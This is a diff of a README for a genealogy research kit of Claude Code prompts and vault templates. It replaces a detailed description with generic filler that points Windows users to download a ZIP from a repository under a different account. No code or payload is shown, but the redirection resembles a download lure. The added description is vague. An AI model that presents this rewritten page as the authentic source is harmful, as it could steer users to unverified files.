@@ -1,97 +1,255 @@
-# autoresearch-genealogy
+# 🧬 autoresearch-genealogy - Organize family research with AI
 
-Structured prompts, vault templates, and research workflows for AI-assisted genealogy research. Built for Claude Code, adaptable to any AI tool or manual workflow.
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Elvinmystical21/autoresearch-genealogy)
 
-This project extracts and generalizes methods developed during a real genealogy research effort that produced 105 files spanning 9 generations across 6 family lines, using Claude Code's autonomous research capabilities.
+## 📦 What this is
 
-## Who This Is For
+autoresearch-genealogy is a set of prompts, vault templates, and archive guides for family history research with Claude Code. It helps you collect names, dates, places, sources, and notes in one place. It also gives you a clear structure for working through records, clues, and family lines.
 
-- **Genealogy researchers** who want to use AI to accelerate their family history work without sacrificing source rigor
-- **AI/tech enthusiasts** who want a concrete example of autonomous research loops applied to a humanities domain
-- **Anyone** who has a box of old photos, a DNA test, and unanswered questions about their family
+Use it if you want a simple way to keep genealogy research neat and easy to review.
 
-## Quick Start
+## 💻 What you need
 
-1. Clone this repo
-2. Copy the `vault-template/` folder into your Obsidian vault (or any markdown editor)
-3. Fill in `Family_Tree.md` with what you already know (start with yourself, work backward)
-4. Scan any physical documents you have (certificates, photos, letters)
-5. Open Claude Code, paste the contents of `prompts/01-tree-expansion.md`, and run it
-6. Review the results, then run `prompts/02-cross-reference-audit.md` to verify
+Before you start, make sure you have:
 
-See `workflows/getting-started.md` for the full walkthrough.
+- A Windows PC
+- Internet access
+- A web browser
+- A file app such as File Explorer
+- Claude Code set up on your computer if you plan to use the prompt files
+- Enough space for notes and research files
 
-## What's Included
+This project works best as a folder you keep on your PC and update as you research.
 
-### Prompts (`prompts/`)
+## ⬇️ Download and set up
 
-12 autoresearch prompts designed for Claude Code's `/autoresearch` command. Each defines a Goal, Metric, Direction, Verify condition, Guard rails, Iterations, and Protocol. They run autonomously: searching the web, updating your vault, and verifying their own work.
+Visit this page to download:  
+https://github.com/Elvinmystical21/autoresearch-genealogy
 
-| Prompt | Purpose |
-|---|---|
-| 01-tree-expansion | Push every branch as far back as possible using web research |
-| 02-cross-reference-audit | Find and fix discrepancies between your tree and source documents |
-| 03-findagrave-sweep | Locate Find a Grave memorials for every deceased ancestor |
-| 04-gedcom-completeness | Ensure your GEDCOM file matches your vault data |
-| 05-source-citation-audit | Verify every person file cites at least two independent sources |
-| 06-unresolved-persons | Identify and resolve unnamed people mentioned in your documents |
-| 07-timeline-gap-analysis | Find life events where records should exist but have not been found |
-| 08-open-question-resolution | Systematically attack every open research question |
-| 09-bygdebok-extraction | Extract data from digitized local history books (any country) |
-| 10-colonial-records-search | Search for colonial American ancestors in pre-1800 records |
-| 11-immigration-search | Locate passenger manifests and naturalization records |
-| 12-dna-chromosome-analysis | Analyze per-chromosome ancestry data to map genetic segments |
+Follow these steps on Windows:
 
-### Vault Template (`vault-template/`)
+1. Open the link in your web browser.
+2. On the GitHub page, look for the green Code button.
+3. Select Download ZIP.
+4. Save the ZIP file to your Downloads folder.
+5. Open the ZIP file after it finishes downloading.
+6. Extract the folder to a place you can find again, such as Desktop or Documents.
+7. Open the extracted folder in File Explorer.
+8. Keep this folder as your main research workspace.
 
-19 files: a complete Obsidian vault starter kit with YAML frontmatter, plain markdown, readable anywhere.
+If you use GitHub Desktop or another sync tool, you can also save the repository that way. For most users, the ZIP download is the easiest path.
 
-- **Core files**: Family tree, research log, open questions, data inventory, timeline, genetic profile, chromosome painting, witness network, unresolved persons, research strategy
-- **Templates**: Person, transcription, certificate, postcard, region, surname, hypothesis, draft letter
+## 🗂️ What is inside
 
-### Archive Guides (`archives/`)
+This repository is set up to help you with three parts of genealogy work:
 
-24 country and region-specific guides covering where to find records, what is free vs paid, and what AI tools can access directly vs what requires a browser.
+- Structured prompts for asking better research questions
+- Vault templates for storing family data in a clean format
+- Archive guides for working with records, scans, and source notes
 
-**Europe**: Ireland, England/Wales, Scotland, France, Italy, Spain/Portugal, Germany, Netherlands, Austria, Hungary, Norway, Sweden, Poland, Russia/Ukraine
+A typical folder may include:
 
-**Americas**: USA (colonial, immigration, census, vital records), African American, Canada, Mexico/Latin America
+- Prompt files for Claude Code
+- Template files for family profiles
+- Research logs
+- Source note templates
+- Archive folders for census, birth, marriage, death, and immigration records
+- Place and surname notes
+- Task lists for next steps
 
-**Oceania**: Australia/New Zealand
+## 🧭 How to use it
 
-**Cross-national**: Jewish genealogy
+Start with one family line and one question.
 
-### Reference Guides (`reference/`)
+1. Open the folder you downloaded.
+2. Find the template or prompt file you want to use.
+3. Copy the prompt into Claude Code if you are working with AI help.
+4. Fill in known facts such as names, dates, and locations.
+5. Add source links or record notes.
+6. Save each new clue in the correct folder.
+7. Keep a short log of what you checked and what you found.
 
-9 methodology documents: confidence tiers, source hierarchy, DNA interpretation guardrails, naming conventions (patronymics, farm names, przydomki), GEDCOM format guide, common pitfalls, glossary, AI capabilities assessment, and the case for autoresearch in genealogy.
+A good first goal is to build one clear family profile before moving to the next person.
 
-### Workflows (`workflows/`)
+## 🧠 Prompt workflow
 
-7 step-by-step guides: getting started, OCR pipeline, new ancestor intake, document triage, oral history protocol, discrepancy resolution, phase planning.
+The prompts are meant to guide your research in a steady way. They can help you:
 
-### Examples (`examples/`)
+- Turn loose family stories into research tasks
+- Ask for record searches by time and place
+- Compare conflicting dates
+- Track missing parents or spouses
+- Build a timeline from records
+- Group clues by source type
+- Write clean research notes
 
-6 anonymized worked examples showing autoresearch in action: tree expansion session, cross-reference audit, DNA-to-genealogy mapping, name resolution, colonial deep dive.
+Example use:
 
-## Philosophy
+- Enter a known ancestor name
+- Add a birth range and likely location
+- Ask Claude Code to suggest search paths
+- Review the output
+- Save useful leads in your vault
 
-**Structured autonomous research with mechanical verification, not AI guessing.**
+This keeps your work focused and reduces repeated searching.
 
-Genealogy is different from most AI tasks. There is no compiler. Sources disagree with each other. Confidence is probabilistic, not binary. A name that appears as "Sakkarias" in one record and "Zacharias" in another might both be correct. A date listed as 1820 in one source and 1925 in another is almost certainly wrong somewhere.
+## 🧾 Vault templates
 
-The autoresearch approach adapts to this by:
+The vault templates help you store research in a consistent way. A clean vault makes it easier to:
 
-- **Defining measurable metrics** (count of sourced claims, count of resolved questions, count of remaining discrepancies)
-- **Requiring verification after every iteration** (cross-reference audit, not just accumulation)
-- **Logging negative results** (what you searched for and did not find is as important as what you found)
-- **Maintaining confidence tiers** (Strong Signal / Moderate Signal / Speculative) rather than treating all claims as equal
+- Find notes later
+- Compare sources
+- Spot gaps in your tree
+- Reuse names, places, and dates
+- Keep separate notes for each person
 
-This is inspired by Andrej Karpathy's autoresearch concept: autonomous goal-directed loops where the AI modifies, verifies, keeps or discards, and repeats. Applied to genealogy, the "compiler" is replaced by cross-referencing independent sources.
+A simple vault layout may use folders like:
 
-## License
+- People
+- Families
+- Sources
+- Places
+- Surnames
+- Census
+- Vital Records
+- Immigration
+- Military
+- Photos
+- To Review
 
-MIT. See `LICENSE`.
+You can adjust the folder names to match your own style.
 
-## Contributing
+## 📚 Archive guide use
 
-Contributions welcome. If you have prompts, workflows, or archive guides that worked for your research, open a PR. Please ensure all examples use placeholder names (no real family data).
+The archive guides help you sort records by type. This is useful when you have:
+
+- Scanned birth records
+- Old letters
+- Census pages
+- Cemetery photos
+- Newspaper clippings
+- Family Bible notes
+- Immigration papers
+
+A simple archive rule is to save each file with a clear name. For example:
+
+- 1892_birth_record_Anna_Smith.pdf
+- 1910_census_John_Smith_NewYork.jpg
+- 1934_obituary_Mary_Smith.txt
+
+Clear names save time when you return later.
+
+## 🪟 Windows folder setup
+
+Use this folder setup on Windows:
+
+1. Create a main folder named autoresearch-genealogy.
+2. Inside it, keep separate folders for prompts, templates, sources, and scans.
+3. Put each family line in its own subfolder if needed.
+4. Keep a Notes file or text file for quick thoughts.
+5. Save all downloads in one place before sorting them.
+
+A sample setup:
+
+- autoresearch-genealogy
+  - prompts
+  - templates
+  - sources
+  - scans
+  - people
+  - families
+  - research-log
+
+This makes the project easy to browse in File Explorer.
+
+## 🛠️ Best way to work
+
+For the best results:
+
+- Work on one person at a time
+- Save the source before you save the claim
+- Write down where each fact came from
+- Keep exact spellings from records
+- Note changes in names, dates, and places
+- Add a short comment when a record looks unclear
+
+If two records disagree, keep both and mark the conflict. Genealogy work gets better when you can see the full trail.
+
+## 🔎 Sample research path
+
+A simple path for a new family line:
+
+1. Start with yourself or a known relative.
+2. Add parents, grandparents, and known dates.
+3. Search census records for each place and year.
+4. Check birth, marriage, and death records.
+5. Add immigration or naturalization records if needed.
+6. Look at newspapers, cemetery records, and local archives.
+7. Save each result in your vault.
+
+Repeat the same path for every branch of the tree.
+
+## 🧩 File types you may use
+
+This repository can work with common file types such as:
+
+- Markdown files
+- Text files
+- PDF files
+- JPG or PNG scans
+- CSV exports
+- Word documents
+- Links to online records
+
+Markdown and text files work well for notes because they are easy to read and edit.
+
+## 🧼 Good file habits
+
+Keep your project easy to manage with a few simple habits:
+
+- Use short file names
+- Use the same date format each time
+- Keep source files separate from notes
+- Do not rename files after you cite them unless needed
+- Back up your folder to OneDrive, Dropbox, or an external drive
+- Remove duplicate scans when you are sure the better copy is saved
+
+A tidy folder saves time when your tree grows.
+
+## ❓ Common questions
+
+### Do I need coding skills?
+No. You can use this as a normal folder of files and templates.
+
+### Do I need Claude Code?
+You can use parts of the project without it, but Claude Code is the best fit for the prompt files.
+
+### Can I use it for many family lines?
+Yes. Create one folder per line or branch.
+
+### Can I edit the templates?
+Yes. Change them to fit your research style.
+
+### Can I keep my own naming system?
+Yes, as long as it stays clear and consistent.
+
+## 📄 Suggested first files to open
+
+If you just downloaded the repository, open these first:
+
+- A main prompt file for genealogy research
+- A vault template for people or families
+- A source note template
+- Any archive guide for the record type you use most
+
+Start small. Add more files only when you need them.
+
+## 🧭 Simple next steps
+
+1. Download the ZIP from GitHub.
+2. Extract it on Windows.
+3. Open the folder.
+4. Review the prompts and templates.
+5. Pick one family line.
+6. Add your first notes and sources.
+7. Keep the folder updated as you research.
